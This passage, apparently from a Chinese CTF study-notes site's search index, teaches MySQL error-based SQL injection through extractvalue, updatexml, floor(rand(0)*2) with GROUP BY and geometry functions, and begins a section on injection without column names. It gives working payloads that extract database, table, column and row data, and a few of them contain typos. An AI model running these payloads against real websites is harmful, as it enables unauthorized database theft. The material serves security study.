<p>\u8fd9\u4e24\u4e2a\u51fd\u6570\u7528\u8d77\u6765\u662f\u6ca1\u4ec0\u4e48\u533a\u522b\u7684</p>"},{"location":"web_bak/sql/SQL_Injection/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#extractvalue","title":"extractvalue\u51fd\u6570\uff1a","text":"<p>\u51fd\u6570\u539f\u578b\uff1aextractvalue(xml_document,Xpath_string)</p> <ul> <li> <p>\u6b63\u5e38\u8bed\u6cd5\uff1aextractvalue(xml_document,Xpath_string);</p> </li> <li> <p>\u7b2c\u4e00\u4e2a\u53c2\u6570\uff1axml_document\u662fstring\u683c\u5f0f\uff0c\u4e3axml\u6587\u6863\u5bf9\u8c61\u7684\u540d\u79f0</p> </li> <li> <p>\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff1aXpath_string\u662fxpath\u683c\u5f0f\u7684\u5b57\u7b26\u4e32</p> </li> <li> <p>\u4f5c\u7528\uff1a\u4ece\u76ee\u6807xml\u4e2d\u8fd4\u56de\u5305\u542b\u6240\u67e5\u8be2\u503c\u7684\u5b57\u7b26\u4e32</p> </li> <li> <p>\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u8981\u6c42\u7b26\u5408xpath\u8bed\u6cd5\u7684\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u4e0d\u6ee1\u8db3\u8981\u6c42\uff0c\u5219\u4f1a\u62a5\u9519\uff0c\u5e76\u4e14\u5c06\u67e5\u8be2\u7ed3\u679c\u653e\u5728\u62a5\u9519\u4fe1\u606f\u91cc\u3002</p> </li> </ul> <p>\u56e0\u6b64\u7ed9\u51fa\u62a5\u9519\u5229\u7528\u7684payload:\uff08\u767d\u5ad6\u515a\uff09</p> <pre><code>id='and(select extractvalue(\"anything\",concat('~',(select\u8bed\u53e5))))\nid='and(select extractvalue(1,concat('~',(select database()))))\nid='and(select extractvalue(1,concat(0x7e,@@version)))\u67e5\u6570\u636e\u5e93\u540d\uff1aid='and(select extractvalue(1,concat(0x7e,(select database()))))\u7206\u8868\u540d\uff1aid='and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))\u7206\u5b57\u6bb5\u540d\uff1aid='and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=\"TABLE_NAME\"))))\u7206\u6570\u636e\uff1aid='and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))\n</code></pre> <p>\u6ce8\u91ca\uff1a</p> <p>\u2460 0x7e=\u2019~\u2019</p> <p>\u2461concat(\u2018a\u2019,\u2018b\u2019)=\u201cab\u201d</p> <p>\u2462version()=@@version</p> <p>\u2463 \u2018~\u2018\u53ef\u4ee5\u6362\u6210\u2019#\u2019\u3001\u2019$'\u7b49\u4e0d\u6ee1\u8db3xpath\u683c\u5f0f\u7684\u5b57\u7b26</p> <p>\u2464extractvalue()\u80fd\u67e5\u8be2\u5b57\u7b26\u4e32\u7684\u6700\u5927\u957f\u5ea6\u4e3a32\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981\u7684\u7ed3\u679c\u8d85\u8fc732\uff0c\u5c31\u8981\u7528substring()\u51fd\u6570\u622a\u53d6\u6216limit\u5206\u9875\uff0c\u4e00\u6b21\u67e5\u770b\u6700\u591a32\u4f4d\u3002\u8fd8\u6709\u7684\u59ff\u52bf\u7684\u8bdd\uff1a\u5229\u7528reverse\u9006\u5411\u8f93\u51fa\u7136\u540e\u81ea\u5df1\u624b\u52a8\u91cd\u5199\u4e00\u4e0b\u4e5f\u662f\u4e00\u79cd\u59ff\u52bf</p>"},{"location":"web_bak/sql/SQL_Injection/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#updatexml","title":"updatexml","text":"<p>\u51fd\u6570\u539f\u578b\uff1aupdatexml(xml_document,xpath_string,new_value)</p> <ul> <li> <p>\u6b63\u5e38\u8bed\u6cd5\uff1aupdatexml(xml_document,xpath_string,new_value)</p> </li> <li> <p>\u7b2c\u4e00\u4e2a\u53c2\u6570\uff1axml_document\u662fstring\u683c\u5f0f\uff0c\u4e3axml\u6587\u6863\u5bf9\u8c61\u7684\u540d\u79f0 \u7b2c\u4e8c\u4e2a\u53c2\u6570\uff1axpath_string\u662fxpath\u683c\u5f0f\u7684\u5b57\u7b26\u4e32</p> </li> <li> <p>\u7b2c\u4e09\u4e2a\u53c2\u6570\uff1anew_value\u662fstring\u683c\u5f0f\uff0c\u66ff\u6362\u67e5\u627e\u5230\u7684\u8d1f\u8377\u6761\u4ef6\u7684\u6570\u636e \u4f5c\u7528\uff1a\u6539\u53d8\u6587\u6863\u4e2d\u7b26\u5408\u6761\u4ef6\u7684\u8282\u70b9\u7684\u503c</p> </li> <li> <p>\u7b2c\u4e8c\u4e2a\u53c2\u6570\u8ddfextractvalue\u51fd\u6570\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e00\u6837\uff0c\u56e0\u6b64\u4e5f\u53ef\u4ee5\u5229\u7528\uff0c\u4e14\u5229\u7528\u65b9\u5f0f\u76f8\u540c</p> </li> <li></li> </ul> <pre><code>id='and(selectupdatexml(\"anything\",concat('~',(select\u8bed\u53e5())),\"anything\"))'and(selectupdatexml(1,concat('~',(select database())),1))'and(selectupdatexml(1,concat(0x7e,@@database),1))\u7206\u6570\u636e\u5e93\u540d\uff1a'and(select updatexml(1,concat(0x7e,(select database())),0x7e))\u7206\u8868\u540d\uff1a'and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),0x7e))\u7206\u5217\u540d\uff1a'and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=\"TABLE_NAME\")),0x7e))\u7206\u6570\u636e\uff1a'and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))\n</code></pre> <p>\u5f62\u5f0f\u7c7b\u4f3c\u5982\u4e0b</p> <p></p> <p>\u62a5\u9519\u5e26\u51fa\u4e86\u5e93\u540d</p> <p>\u78b0\u5230\u9898\u76ee\u4e00\u822c\u548cbool\u76f2\u6ce8\u548c\u65f6\u95f4\u76f2\u6ce8\u653e\u4e00\u8d77\u6765</p> <p>\u4f8b\u9898\uff1a[CISCN2019 \u534e\u5317\u8d5b\u533a Day1 Web5]CyberPunk</p> <p>\uff08\u8fd9\u9898\u8fd8\u6709\u4e8c\u6b21\u6ce8\u5165\uff09</p>"},{"location":"web_bak/sql/SQL_Injection/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#_2","title":"\u4e3b\u952e\u91cd\u590d","text":"<p>\u5168\u79f0\u662f\uff1aconcat+rand()+group_by()\u5bfc\u81f4\u4e3b\u952e\u91cd\u590d</p> <p>\u793a\u4f8b\u5728\u4e0b\u9762</p> <p>\u8fd9\u79cd\u62a5\u9519\u65b9\u6cd5\u7684\u672c\u8d28\u662f\u56e0\u4e3afloor(rand(0)*2)\u7684\u91cd\u590d\u6027\uff0c\u5bfc\u81f4group by\u8bed\u53e5\u51fa\u9519\u3002group by key\u7684\u539f\u7406\u662f\u5faa\u73af\u8bfb\u53d6\u6570\u636e\u7684\u6bcf\u4e00\u884c\uff0c\u5c06\u7ed3\u679c\u4fdd\u5b58\u4e8e\u4e34\u65f6\u8868\u4e2d\u3002\u8bfb\u53d6\u6bcf\u4e00\u884c\u7684key\u65f6\uff0c\u5982\u679ckey\u5b58\u5728\u4e8e\u4e34\u65f6\u8868\u4e2d\uff0c\u5219\u4e0d\u5728\u4e34\u65f6\u8868\u4e2d\u66f4\u65b0\u4e34\u65f6\u8868\u7684\u6570\u636e\uff1b\u5982\u679ckey\u4e0d\u5728\u4e34\u65f6\u8868\u4e2d\uff0c\u5219\u5728\u4e34\u65f6\u8868\u4e2d\u63d2\u5165key\u6240\u5728\u884c\u7684\u6570\u636e\u3002</p> <p>floor\u51fd\u6570\u7684\u4f5c\u7528\u662f\u8fd4\u56de\u5c0f\u4e8e\u7b49\u4e8e\u8be5\u503c\u7684\u6700\u5927\u6574\u6570,\u4e5f\u53ef\u4ee5\u7406\u89e3\u4e3a\u5411\u4e0b\u53d6\u6574\uff0c\u53ea\u4fdd\u7559\u6574\u6570\u90e8\u5206\u3002</p> <p>rand()\u51fd\u6570\u53ef\u4ee5\u7528\u6765\u751f\u62100\u62161\uff0c\u4f46\u662frand(0)\u548crand()\u8fd8\u662f\u6709\u672c\u8d28\u533a\u522b\u7684\uff0crand(0)\u76f8\u5f53\u4e8e\u7ed9rand()\u51fd\u6570\u4f20\u9012\u4e86\u4e00\u4e2a\u53c2\u6570\uff0c\u7136\u540erand()\u51fd\u6570\u4f1a\u6839\u636e0\u8fd9\u4e2a\u53c2\u6570\u8fdb\u884c\u968f\u673a\u6570\u6210\u6210\u3002rand()\u751f\u6210\u7684\u6570\u5b57\u662f\u5b8c\u5168\u968f\u673a\u7684\uff0c\u800crand(0)\u662f\u6709\u89c4\u5f8b\u7684\u751f\u6210\uff0c\u5f88\u663e\u7136rand(0)\u662f\u4f2a\u968f\u673a\u7684\uff0c\u6709\u89c4\u5f8b\u53ef\u5faa\uff0c\u8fd9\u4e5f\u662f\u6211\u4eec\u91c7\u7528rand(0)\u8fdb\u884c\u62a5\u9519\u6ce8\u5165\u7684\u539f\u56e0\uff0crand(0)\u662f\u7a33\u5b9a\u7684\uff0c\u8fd9\u6837\u6bcf\u6b21\u6ce8\u5165\u90fd\u4f1a\u62a5\u9519</p> <p>(\u4e3e\u4e2a\u4f8b\u5b50\u7406\u89e3\uff1a\u5f53\u521d\u5b66C\u8bed\u8a00\u7684\u65f6\u5019\u7684\u90a3\u4e2asrand\u8bbe\u7acb\u968f\u673a\u6570\u79cd\u5b50\u4e00\u822c\u4f1a\u7528time\u7684\u539f\u56e0\u662f\u4ec0\u4e48\uff1f\u6ca1\u9519\uff0c\u56e0\u4e3a\u5982\u679c\u968f\u673a\u6570\u8868\u91cc\u9762\u7684\u968f\u673a\u6570\u79cd\u5b50\u4e0d\u53d1\u751f\u6539\u53d8\u7684\u8bdd\uff0c\u51fd\u6570\u6bcf\u6b21\u91cd\u65b0\u8fd0\u884c\u90fd\u4f1a\u51fa\u73b0\u4e00\u6837\u7684\u7ed3\u679c\u3002)</p> <p>\u6211\u4eec\u4f7f\u7528group by\u8fdb\u884c\u5206\u7ec4\u67e5\u8be2\u7684\u65f6\u5019\uff0c\u6570\u636e\u5e93\u4f1a\u751f\u6210\u4e00\u5f20\u865a\u62df\u8868</p> <p>\u5728\u8fd9\u5f20\u865a\u62df\u8868\u4e2d\uff0cgroupby\u540e\u9762\u7684\u5b57\u6bb5\u4f5c\u4e3a\u4e3b\u952e\uff0c\u6240\u4ee5\u8fd9\u5f20\u8868\u4e2d\u4e3b\u952e\u662fname\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u57fa\u672c\u5f04\u6e05\u62a5\u9519\u7684\u539f\u56e0\u4e86\uff0c\u5176\u539f\u56e0\u4e3b\u8981\u662f\u56e0\u4e3a\u865a\u62df\u8868\u7684\u4e3b\u952e\u91cd\u590d\u3002\u6309\u7167MySQL\u7684\u5b98\u65b9\u8bf4\u6cd5\uff0cgroup by\u8981\u8fdb\u884c\u4e24\u6b21\u8fd0\u7b97\uff0c\u7b2c\u4e00\u6b21\u662f\u62ffgroup by\u540e\u9762\u7684\u5b57\u6bb5\u503c\u5230\u865a\u62df\u8868\u4e2d\u53bb\u5bf9\u6bd4\u524d\uff0c\u9996\u5148\u83b7\u53d6group by\u540e\u9762\u7684\u503c\uff1b\u7b2c\u4e8c\u6b21\u662f\u5047\u8bbegroup by\u540e\u9762\u7684\u5b57\u6bb5\u7684\u503c\u5728\u865a\u62df\u8868\u4e2d\u4e0d\u5b58\u5728\uff0c\u90a3\u5c31\u9700\u8981\u628a\u5b83\u63d2\u5165\u5230\u865a\u62df\u8868\u4e2d\uff0c\u8fd9\u91cc\u5728\u63d2\u5165\u65f6\u4f1a\u8fdb\u884c\u7b2c\u4e8c\u6b21\u8fd0\u7b97\uff0c\u7531\u4e8erand\u51fd\u6570\u5b58\u5728\u4e00\u5b9a\u7684\u968f\u673a\u6027\uff0c\u6240\u4ee5\u7b2c\u4e8c\u6b21\u8fd0\u7b97\u7684\u7ed3\u679c\u53ef\u80fd\u4e0e\u7b2c\u4e00\u6b21\u8fd0\u7b97\u7684\u7ed3\u679c\u4e0d\u4e00\u81f4\uff0c\u4f46\u662f\u8fd9\u4e2a\u8fd0\u7b97\u7684\u7ed3\u679c\u53ef\u80fd\u5728\u865a\u62df\u8868\u4e2d\u5df2\u7ecf\u5b58\u5728\u4e86\uff0c\u90a3\u4e48\u8fd9\u65f6\u7684\u63d2\u5165\u5fc5\u7136\u5bfc\u81f4\u4e3b\u952e\u7684\u91cd\u590d\uff0c\u8fdb\u800c\u5f15\u53d1\u9519\u8bef\u3002</p> <p>\u7528\u5230\u7684\u51fd\u6570floor()</p> <pre><code>group by\u662f\u6839\u636e\u4e00\u4e2a\u6216\u591a\u4e2a\u5217\u5bf9\u7ed3\u679c\u96c6\u8fdb\u884c\u5206\u7ec4\u7684sql\u8bed\u53e5\uff0c\u5176\u7528\u6cd5\u4e3a\uff1a\nSELECTcolumn_name, aggregate_function(column_name)\nFROM table_name\nWHERE column_nameoperator value\nGROUP BYcolumn_name\n\npayload:'unionselect 1 from (select count(*),concat((slelect\u8bed\u53e5),floor(rand(0)*2))x from \"\u4e00\u4e2a\u8db3\u5927\u7684\u8868\" group by x)a--+\n\u7206\u6570\u636e\u5e93\u540d\uff1a'union select 1 from (select count(*),concat((select database()),\" \",floor(rand(0)*2))x from information_schema.tables group by x)a\n\u7206\u8868\u540d\uff1a'union select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,\" \",floor(rand(0)*2))x from information_schema.tables group by x)a\n\u7206\u5217\u540d\uff1a'union select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name=\"TABLE_NAME\" limit 0,1) ,\" \",floor(rand(0)*2))x from information_schema.tables group by x)a\n\u7206\u6570\u636e\uff1a'union select 1 from (select count(*),concat((select COLUMN_NAME from TABLE_NAME limit 0,1) ,\" \",floor(rand(0)*2))x from information_schema.tables group by x)a\n</code></pre>"},{"location":"web_bak/sql/SQL_Injection/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#_3","title":"\u5177\u4f53\u539f\u7406\u793a\u4f8b","text":"<p>copy\u3001\u540e\u6765\u672c\u5730\u505a\u8fc7\u51e0\u6b21\u6d4b\u8bd5</p> <p>\u6211\u4eec\u9700\u8981\u77e5\u9053group by\u7684\u751f\u6210\u865a\u62df\u8868\u7684\u673a\u5236</p> <p></p> <p></p> <p>\u6700\u5f00\u59cb\u6211\u4eec\u770b\u5230\u7684\u8fd9\u5f20sage-count()\u8868\u5e94\u8be5\u65f6\u7a7a\u7684\uff0c\u4f46\u662f\u5728group by\u8bed\u53e5\u6267\u884c\u8fc7\u7a0b\u4e2d\uff0c\u4e00\u884c\u4e00\u884c\u7684\u53bb\u626b\u63cf\u539f\u59cb\u8868\u7684sage\u5b57\u6bb5\uff0c\u5982\u679csage\u5728sage-count()\u4e0d\u5b58\u5728\uff0c\u90a3\u4e48\u5c31\u5c06\u4ed6\u63d2\u5165\uff0c\u5e76\u7f6ecount()\u7f6e1\uff0c\u5982\u679csage\u5728sage-count()\u8868\u4e2d\u5df2\u7ecf\u5b58\u5728\uff0c\u90a3\u4e48\u5c31\u5728\u539f\u6765\u7684count(*)\u57fa\u7840\u4e0a\u52a01\uff0c\u5c31\u8fd9\u6837\u76f4\u5230\u626b\u63cf\u5b8c\u6574\u4e2a\u8868\uff0c\u5c31\u5f97\u5230\u6211\u4eec\u770b\u5230\u7684\u8fd9\u4e2a\u8868\u4e86\u3002</p> <p>\u6ce8\uff1a\u8fd9\u91cc\u6709\u7279\u522b\u91cd\u8981\u7684\u4e00\u70b9\uff0cgroup by\u540e\u9762\u7684\u5b57\u6bb5\u662f\u865a\u62df\u8868\u7684\u4e3b\u952e\uff0c\u4e5f\u5c31\u662f\u8bf4\u5b83\u662f\u4e0d\u80fd\u91cd\u590d\u7684\uff0c\u8fd9\u662f\u540e\u9762\u62a5\u9519\u6210\u529f\u7684\u5173\u952e\u70b9</p> <p></p> <p>rand(0)\u751f\u6210\u7684\u6570\u636e\u6709\u89c4\u5f8b\u53ef\u5faa</p> <p>0110 0110</p> <p>\u7b2c\u4e00\u6b21\uff1a\u6211\u4eec\u4e4b\u524d\u4e0d\u662f\u8bf4\u4e86\u4f1a\u628agroup by\u540e\u9762\u7684\u5b57\u6bb5\u503c\u62ff\u5230\u865a\u62df\u8868\u4e2d\u53bb\u5bf9\u6bd4\u5417\uff0c\u5728\u5bf9\u6bd4\u4e4b\u524d\u80af\u5b9a\u8981\u77e5\u9053group by\u540e\u9762\u5b57\u6bb5\u7684\u503c\uff0c\u6240\u4ee5\u7b2c\u4e00\u6b21\u7684\u8fd0\u7b97\u5c31\u53d1\u751f\u5728\u8fd9\u91cc\u3002</p> <p>\u7b2c\u4e8c\u6b21\uff1a\u73b0\u5728\u5047\u8bbe\u6211\u4eec\u4e0b\u4e00\u6b21\u626b\u63cf\u7684\u5b57\u6bb5\u7684\u503c\u6ca1\u6709\u5728\u865a\u62df\u8868\u4e2d\u51fa\u73b0\uff0c\u4e5f\u5c31\u662fgroup by\u540e\u9762\u7684\u5b57\u6bb5\u7684\u503c\u5728\u865a\u62df\u8868\u4e2d\u8fd8\u4e0d\u5b58\u5728\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u9700\u8981\u628a\u5b83\u63d2\u5165\u5230\u865a\u62df\u8868\u4e2d\uff0c\u8fd9\u91cc\u5728\u63d2\u5165\u65f6\u4f1a\u8fdb\u884c\u7b2c\u4e8c\u6b21\u8fd0\u7b97\uff0c\u7531\u4e8erand\u51fd\u6570\u5b58\u5728\u4e00\u5b9a\u7684\u968f\u673a\u6027\uff0c\u6240\u4ee5\u7b2c\u4e8c\u6b21\u8fd0\u7b97\u7684\u7ed3\u679c\u53ef\u80fd\u4e0e\u7b2c\u4e00\u6b21\u8fd0\u7b97\u7684\u7ed3\u679c\u4e0d\u4e00\u81f4\uff0c\u4f46\u662f\u8fd9\u4e2a\u8fd0\u7b97\u7684\u7ed3\u679c\u53ef\u80fd\u5728\u865a\u62df\u8868\u4e2d\u5df2\u7ecf\u5b58\u5728\u4e86\uff0c\u90a3\u4e48\u8fd9\u65f6\u7684\u63d2\u5165\u5fc5\u7136\u5bfc\u81f4\u9519\u8bef\uff01</p> <p>\u7136\u540e\u8d70\u4e00\u904d\u6d41\u7a0b</p> <pre><code>select count(*),(concat(floor(rand(0)*2),'@',(select version())))x from users group by x\n</code></pre> <p></p> <p>\u6211\u4eec\u8ddf\u7740\u521a\u521a\u7684\u601d\u8def\u8d70\uff0c\u6700\u5f00\u59cb\u7684\u865a\u62df\u8868\u662f\u7a7a\u7684\uff0c\u5c31\u50cf\u4e0b\u9762\u4e00\u6837\uff1a</p> <p>\u5f53\u6211\u626b\u63cf\u539f\u59cb\u8868\u7684\u7b2c\u4e00\u9879\u65f6\uff0c\u7b2c\u4e00\u6b21\u8ba1\u7b97\uff0cfloor(rand(0)*2)\u662f0\uff0c\u7136\u540e\u548c\u6570\u636e\u5e93\u7684\u7248\u672c\u53f7\uff08\u5047\u8bbe\u5c31\u662f5.7.19\uff09\u62fc\u63a5\uff0c\u5230\u865a\u62df\u8868\u91cc\u53bb\u5bfb\u627ex\u6709\u6ca1\u6709x\u7684\u503c\u662fx@5.7.19\u7684\u6570\u636e\u9879\uff0c\u7ed3\u679c\u663e\u7136\u662f\u6ca1\u6709\uff0c\u90a3\u4e48\u63a5\u4e0b\u6765\u5c31\u5c06\u5b83\u63d2\u5165\u5230\u4e0a\u8868\u4e2d\uff0c\u4f46\u662f\u8fd8\u8bb0\u5f97\u5417\uff0c\u5728\u63d2\u5165\u4e4b\u524d\u4f1a\u8fdb\u884c\u7b2c\u4e8c\u6b21\u8ba1\u7b97\uff0c\u8fd9\u65f6x\u7684\u503c\u5c31\u53d8\u6210\u4e861@5.7.19\uff0c\u6240\u4ee5\u865a\u62df\u8868\u53d8\u6210\u4e86\u4e0b\u9762\u8fd9\u6837\uff1a</p> <p>\u73b0\u5728\u626b\u63cf\u539f\u59cb\u8868\u7684\u7b2c\u4e8c\u9879\uff0c\u7b2c\u4e00\u6b21\u8ba1\u7b97x==\u20191@5.7.19\u2018\uff0c\u5df2\u7ecf\u5b58\u5728\uff0c\u4e0d\u9700\u8981\u8fdb\u884c\u7b2c\u4e8c\u6b21\u8ba1\u7b97\uff0c\u76f4\u63a5\u63d2\u5165\uff0c\u5f97\u5230\u4e0b\u8868\uff1a</p> <p>\u626b\u63cf\u539f\u59cb\u8868\u7684\u7b2c\u4e09\u9879\uff0c\u7b2c\u4e00\u6b21\u8ba1\u7b97x==\u20180@5.7.19\u2019\uff0c\u865a\u62df\u8868\u4e2d\u627e\u4e0d\u5230\uff0c\u90a3\u4e48\u8fdb\u884c\u7b2c\u4e8c\u6b21\u8ba1\u7b97\uff0c\u8fd9\u65f6x==\u20181@5.7.19\u2019\uff0c\u7136\u540e\u63d2\u5165\uff0c\u4f46\u662f\u63d2\u5165\u7684\u65f6\u5019\u95ee\u9898\u5c31\u53d1\u751f\u4e86\uff0c\u865a\u62df\u8868\u4e2d\u5df2\u7ecf\u5b58\u5728\u4ee51@5.7.19\u4e3a\u4e3b\u952e\u7684\u6570\u636e\u9879\u4e86\uff0c\u63d2\u5165\u5931\u8d25\uff0c\u7136\u540e\u5c31\u62a5\u9519\u4e86\uff01</p> <p>\u603b\u4e4b\uff0c\u62a5\u9519\u6ce8\u5165\uff0crand(0),floor(),group by\u7f3a\u4e00\u4e0d\u53ef</p> <p>\u8fd8\u662f\u633a\u5de7\u5999\u7684\u3002</p> <p>\u4f46\u662f\u7528\u8d77\u6765\u5c31\u6253payload</p>"},{"location":"web_bak/sql/SQL_Injection/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#_4","title":"\u66b4\u529b","text":"<p>\u66b4\u529b\u80fd\u89e3\u51b3\u5f88\u591a\u95ee\u9898\uff0c\u5e0c\u671b\u4e0b\u9762\u7684\u51fd\u6570\u80fd\u5e2e\u52a9\u5230\u5927\u5bb6</p> <pre><code>1.floor()\nselect * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);\n2.extractvalue()\nselect * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));\n3.updatexml()\nselect * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));\n4.geometrycollection()\nselect * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));\n5.multipoint()\nselect * from test where id=1 and multipoint((select * from(select * from(select user())a)b));\n6.polygon()\nselect * from test where id=1 and polygon((select * from(select * from(select user())a)b));\n7.multipolygon()\nselect * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));\n8.linestring()\nselect * from test where id=1 and linestring((select * from(select * from(select user())a)b));\n9.multilinestring()\nselect * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));\n10.exp()\nselect * from test where id=1 and exp(~(select * from(select user())a));\n</code></pre>"},{"location":"web_bak/sql/SQL_Injection/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/","title":"\u65e0\u5217\u540d\u6ce8\u5165","text":"<p>\u521d\u5b66\u8005\u5efa\u8bae\u5148\u770b\u4f8b\u9898-2\u770b\u770b\u4f7f\u7528\uff0c\u5176\u5b83\u77e5\u9053\u7684\u8bdd\u968f\u610f\uff0c\u5c31\u5f53\u770b\u4e2a\u70ed\u95f9\u3002</p>"},{"location":"web_bak/sql/SQL_Injection/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/#information_schema","title":"\u9996\u5148\u662finformation_schema","text":"<p>information_schema \u6570\u636e\u5e93\u8ddf performance_schema \u4e00\u6837\uff0c\u90fd\u662f MySQL \u81ea\u5e26\u7684\u4fe1\u606f\u6570\u636e\u5e93\u3002\u5176\u4e2d performance_schema \u7528\u4e8e\u6027\u80fd\u5206\u6790\uff0c\u800c information_schema \u7528\u4e8e\u5b58\u50a8\u6570\u636e\u5e93\u5143\u6570\u636e(\u5173\u4e8e\u6570\u636e\u7684\u6570\u636e)\uff0c\u4f8b\u5982\u6570\u636e\u5e93\u540d\u3001\u8868\u540d\u3001\u5217\u7684\u6570\u636e\u7c7b\u578b\u3001\u8bbf\u95ee\u6743\u9650\u7b49\u3002</p> <p>information_schema \u4e2d\u7684\u8868\u5b9e\u9645\u4e0a\u662f\u89c6\u56fe\uff0c\u800c\u4e0d\u662f\u57fa\u672c\u8868\uff0c\u56e0\u6b64\uff0c\u6587\u4ef6\u7cfb\u7edf\u4e0a\u6ca1\u6709\u4e0e\u4e4b\u76f8\u5173\u7684\u6587\u4ef6\u3002</p> <pre><code>mysql&gt; use information_schema;\nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A\nDatabase changed\nmysql&gt; show tables;\n+---------------------------------------+\n| Tables_in_information_schema          |\n+---------------------------------------+\n| CHARACTER_SETS                        |\n| COLLATIONS                            |\n| COLLATION_CHARACTER_SET_APPLICABILITY |\n| COLUMNS                               |\n| COLUMN_PRIVILEGES                     |\n| ENGINES                               |\n| EVENTS                                |\n| FILES                                 |\n| GLOBAL_STATUS                         |\n| GLOBAL_VARIABLES                      |\n| KEY_COLUMN_USAGE                      |\n| OPTIMIZER_TRACE                       |\n| PARAMETERS                            |\n| PARTITIONS                            |\n| PLUGINS                               |\n| PROCESSLIST                           |\n| PROFILING                             |\n| REFERENTIAL_CONSTRAINTS               |\n| ROUTINES                              |\n| SCHEMATA                              |\n| SCHEMA_PRIVILEGES                     |\n| SESSION_STATUS                        |\n| SESSION_VARIABLES                     |\n| STATISTICS                            |\n| TABLES                                |\n| TABLESPACES                           |\n| TABLE_CONSTRAINTS                     |\n| TABLE_PRIVILEGES                      |\n| TRIGGERS                              |\n| USER_PRIVILEGES                       |\n| VIEWS                                 |\n| INNODB_LOCKS                          |\n| INNODB_TRX                            |\n| INNODB_SYS_DATAFILES                  |\n| INNODB_FT_CONFIG                      |\n| INNODB_SYS_VIRTUAL                    |\n| INNODB_CMP                            |\n| INNODB_FT_BEING_DELETED               |\n| INNODB_CMP_RESET                      |\n| INNODB_CMP_PER_INDEX                  |\n| INNODB_CMPMEM_RESET                   |\n| INNODB_FT_DELETED                     |\n| INNODB_BUFFER_PAGE_LRU                |\n| INNODB_LOCK_WAITS                     |\n| INNODB_TEMP_TABLE_INFO                |\n| INNODB_SYS_INDEXES                    |\n| INNODB_SYS_TABLES                     |\n| INNODB_SYS_FIELDS                     |\n| INNODB_CMP_PER_INDEX_RESET            |\n| INNODB_BUFFER_PAGE                    |\n| INNODB_FT_DEFAULT_STOPWORD            |\n| INNODB_FT_INDEX_TABLE                 |\n| INNODB_FT_INDEX_CACHE                 |\n| INNODB_SYS_TABLESPACES                |\n| INNODB_METRICS                        |\n| INNODB_SYS_FOREIGN_COLS               |\n| INNODB_CMPMEM                         |\n| INNODB_BUFFER_POOL_STATS              |\n| INNODB_SYS_COLUMNS                    |\n| INNODB_SYS_FOREIGN                    |\n| INNODB_SYS_TABLESTATS                 |\n+---------------------------------------+\n</code></pre> <p>MySQL \u4e2d\u7684 information_schema \u6570\u636e\u5e93_kikajack\u7684\u535a\u5ba2-CSDN\u535a\u5ba2</p> <ol> <li>\u6982\u8ff0information_schema \u6570\u636e\u5e93\u8ddf performance_schema \u4e00\u6837\uff0c\u90fd\u662f MySQL \u81ea\u5e26\u7684\u4fe1\u606f\u6570\u636e\u5e93\u3002\u5176\u4e2d performance_schema \u7528\u4e8e\u6027\u80fd\u5206\u6790\uff0c\u800c information_schema \u7528\u4e8e\u5b58\u50a8\u6570\u636e\u5e93\u5143\u6570\u636e(\u5173\u4e8e\u6570\u636e\u7684\u6570\u636e)\uff0c\u4f8b\u5982\u6570\u636e\u5e93\u540d\u3001\u8868\u540d\u3001\u5217\u7684\u6570\u636e\u7c7b\u578b\u3001\u8bbf\u95ee\u6743\u9650\u7b49\u3002information_schema \u4e2d\u7684\u8868\u5b9e\u9645\u4e0a\u662f\u89c6\u56fe\uff0c\u800c\u4e0d\u662f\u57fa\u672c...</li> </ol> <p>https://blog.csdn.net/kikajack/article/details/80065753</p> <p>\u5269\u4e0b\u7684\u81ea\u5df1\u53ef\u4ee5\u53bb\u770b\u770b\u3002</p>"},{"location":"web_bak/sql/SQL_Injection/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/#infromation_schema","title":"\u7ed5\u8fc7infromation_schema \u65e0\u5217\u540d\u6ce8\u5165\uff1a","text":"<p>\u603b\u4e4b\uff0c\u5982\u679c\u662fmysql\uff0c\u90a3\u4e48\u8fd9\u4e2a\u5143\u6570\u636e\u5e93\u5c31\u662f\u4f60\u8086\u65e0\u5fcc\u60ee\u7684\u4fdd\u8bc1\uff0c\u7531\u4e8e\u5b83\u5b58\u50a8\u4e86\u6570\u636e\u5e93\u5168\u90e8\u7684\u4fe1\u606f\uff0c\u53ea\u8981\u6709\u4e86\u4ed6\uff0c\u57fa\u672c\u7684\u64cd\u4f5c\u5c31\u6709\u4e86\u4fdd\u969c\u3002</p> 